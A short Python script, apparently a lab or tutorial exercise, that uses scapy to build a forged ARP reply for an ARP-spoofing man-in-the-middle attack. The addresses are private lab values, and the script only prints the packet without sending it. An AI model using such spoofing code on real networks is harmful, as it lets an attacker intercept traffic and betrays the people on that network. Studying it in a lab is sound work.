#!/usr/bin/env python

"""
| Description:
    Spoofs router and victim MAC address using MITM attack.
| Version:
    1
| Notes:
    
| Algorithm:
     
| Variables:

"""

import scapy.all as scapy

# target ip, target mac, router ip
packet = scapy.ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:85:86:27", psrc="10.0.2.1")
print(packet.show())
print(packet.summary())

